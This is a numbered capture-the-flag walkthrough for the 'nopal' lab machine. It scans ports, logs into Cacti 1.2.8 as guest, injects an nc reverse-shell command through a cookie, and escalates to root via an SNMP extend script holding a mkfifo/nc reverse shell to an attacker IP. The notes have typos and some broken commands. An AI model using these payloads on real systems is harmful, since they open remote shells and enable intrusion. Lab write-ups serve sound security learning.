1. We're going to machine nopal, first type sudo su and openvpn echoctf.openvp
2. scanner ports with command nmap -sS -sV -sC -p- -vvv -oN scanner_nopal 10.0.30.124
3. too masscan -p0-65535 10.0.30.124 -inte=1000 -e tun0
4. enter to page, you view interface user and password of cacti
version 1.2.8
5. search vulnerabiliy and we found user:guest and password:guest
6. use burpsuit for monitoring traficc and found vulnerability 
in head of page, its a cookie modificable.
7. edit content cookie with ;nc${IFS}-e${IFS}/bin/bash{IFS}<IP 
in that case it was 10.10.1.50>${IFS}<port tcp/ip for that moment
it was 1432>
Hint: the ${IFS} is space betwen phrases.
8. let's go to page icyberchef.com, this page encode url in its 
option search add url and select it URL Encode, catched Encoded 
all speciall chars
9. open other terminal and typing: nc -nlvp 1432
10. the content copy in content cookie and resend in burp suit.
11. waiting to received message Connection received on 10.0.30.124 37914 in this case, machine's IP vulnerably and its port
12. Get in machine, typing whoami, I saw www-data
13. apply python -c 'import pty; pty.spawn("/bin/bash")' for 
configure to pseudo-terminal and controller terminal with current
process's standard io 
14. send process to bachground with command CTRL+Z for make shell
more stable.
15 apply stty raw -echo and later fg 
16. export TERM=xterm
17. first flag /etc/passwd
18. check what ports we have running locally with command ss (sockets
stadistics) witn option t(tcp)u(udp)l(listen)p(process ID-PID)n(
numeric don't resolve service names)
19. We can see port used for SNMP (generally 161 or 162) and 
let's go to /etc/snmp 
20. We see in file snmpd.conf flag and authorized access to root
user the server with snmp extend etsctf /tmp/snmpd-test.sh
21. We need to change directory /tmp to create the file snmpd-test.sh
that will hold our reverse shell payload to access root user.
22. we create file snmpd-test.sh--->
#!/bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <10.10.1.50
this case> 4444 >/tmp/f
23. open other terminal and typing nc -nvlp 4444
24.typing chmod +x snmpd-tests.sh
25. later snmpwalk 127.0.0.1 -c public -v1 . -On
26. agentAddress udp 127.0.0.1:161 in file snmpd.conf
27. apply steps 13-16
28. search in directory /etc/shadow other flag
29. directory root.
30. typing ps -aux (environment) PID 1
31. let's go to directory proc/1/environ before access super user with
su root
